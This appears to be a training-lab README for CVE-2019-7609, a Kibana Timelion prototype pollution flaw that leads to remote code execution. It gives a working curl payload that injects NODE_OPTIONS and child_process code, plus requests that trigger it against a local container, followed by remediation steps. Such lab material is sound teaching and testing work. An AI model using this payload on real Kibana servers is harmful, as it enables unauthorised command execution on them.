# Kibana Timelion Server-Side Prototype Pollution RCE (CVE-2019-7609)

## Overview

Kibana is an open-source data exploration and visualization dashboard for Elasticsearch. In Kibana versions before 5.6.15 and 6.6.1, the Timelion visualizer contains an arbitrary code execution flaw (CVE-2019-7609 / ESA-2019-02). An unauthenticated attacker with access to the Timelion application or its HTTP API can send crafted expressions to pollute `Object.prototype`, injecting environment variables that result in arbitrary remote command execution when Node.js child processes are spawned.

- **Service Access**: `http://localhost:8155/`
- **Default Credentials**: `Unauthenticated`
- **Docker Shortcut**: `./lab start kibana-prototype-rce`
- **Container Name**: `cyberlab_02_kibana_prototype_rce`
- **RAM Footprint**: ~500M

---

## Vulnerability Mechanism

The Timelion visualizer parses time-series expressions and executes chained series manipulation functions such as `.props()`. When evaluating arguments like:

```text
.es(*).props(label.__proto__.env.AAAA=test)
```

the expression engine recursively assigns properties across object keys without validating or filtering sensitive prototype chain identifiers (such as `__proto__`, `constructor`, or `prototype`). Consequently, arbitrary properties are injected directly onto `Object.prototype.env`.

In Node.js applications, spawned child processes (via `child_process.fork()` or `child_process.spawn()`) inherit environment settings derived from object prototypes when options are not sanitized. By polluting:

1. `label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ'`
2. `label.__proto__.env.AAAA='require("child_process").exec("...");process.exit()//'`

any subsequent child process execution (such as background tasks triggered by Canvas, Reporting, or Socket.io polling) starts Node.js with the `NODE_OPTIONS` flag pointing to `/proc/self/environ`. Node.js reads the process environment file, encounters the injected JavaScript in variable `AAAA`, and executes the arbitrary command with permissions of the `kibana` user.

---

## Exploitation Walkthrough

### 1. Verify Kibana Dashboard & API Availability

Check that the Kibana instance and its dependent plugins (including `timelion`) report healthy status:

```bash
curl -i http://localhost:8155/api/status
```

Expected response includes `HTTP/1.1 200 OK` with status `"overall":{"state":"green"}`.

### 2. Send Prototype Pollution Payload via Timelion Run API

Send a crafted POST request to `/api/timelion/run` containing the prototype pollution payload. The request must include the `kbn-version: 6.5.4` header:

```bash
curl -i -X POST 'http://localhost:8155/api/timelion/run' \
  -H 'kbn-version: 6.5.4' \
  -H 'Content-Type: application/json' \
  -d '{"sheet":[".es(*).props(label.__proto__.env.AAAA=\"require(\\\"child_process\\\").exec(\\\"touch /tmp/pwned_kibana\\\");process.exit()//\").props(label.__proto__.env.NODE_OPTIONS=\"--require /proc/self/environ\")"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"10s","timezone":"Asia/Shanghai"}}'
```

### 3. Trigger Child Process Spawn

Trigger a background process fork via the socket polling endpoint or by navigating to Canvas / Reporting:

```bash
curl -i 'http://localhost:8155/socket.io/?EIO=3&transport=polling&t=test' \
  -H 'kbn-version: 6.5.4' \
  -H 'kbn-xsrf: kibana'
```

Alternatively, visit the Canvas dashboard in your browser or curl the Canvas interface:

```bash
curl -i http://localhost:8155/app/canvas
```

### 4. Verify Command Execution

Inspect the container filesystem to verify that the arbitrary command executed successfully:

```bash
docker exec -it cyberlab_02_kibana_prototype_rce ls -la /tmp/pwned_kibana
```

---

## Defensive Remediation & Hardening

1. **Upgrade Kibana**: Upgrade to version 5.6.15, 6.6.1, or higher where prototype assignments in Timelion expressions are properly sanitized.
2. **Access Control**: Restrict Kibana dashboard endpoints behind strict authentication proxies or VPNs.
3. **Disable Timelion Module**: If Timelion is not strictly required in the deployment, disable it in `config/kibana.yml`:
   ```yaml
   timelion.enabled: false
   ```
4. **Harden Node Process Environment**: Set restrictive file permissions and consider container sandboxing (e.g. read-only root filesystems, minimal capabilities) to prevent process injection via `/proc/self/environ`.

---

## References & Advisories

- [Vulhub Kibana CVE-2019-7609 Environment](https://vulhub.org/#/environments/kibana/CVE-2019-7609/)
- [Official Vulhub Repository (kibana/CVE-2019-7609)](https://github.com/vulhub/vulhub/tree/master/kibana/CVE-2019-7609)
- [Elastic Security Advisory ESA-2019-02 (CVE-2019-7609)](https://discuss.elastic.co/t/elastic-stack-6-6-1-and-5-6-15-security-update/169048)
- [NVD CVE-2019-7609 Detail](https://nvd.nist.gov/vuln/detail/CVE-2019-7609)
- [Securitum Research: Prototype Pollution RCE in Kibana](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
- [Exploiting Prototype Pollution in JavaScript for Server-Side RCE (Video)](https://www.youtube.com/watch?v=9UAQ1VzSq8Q)
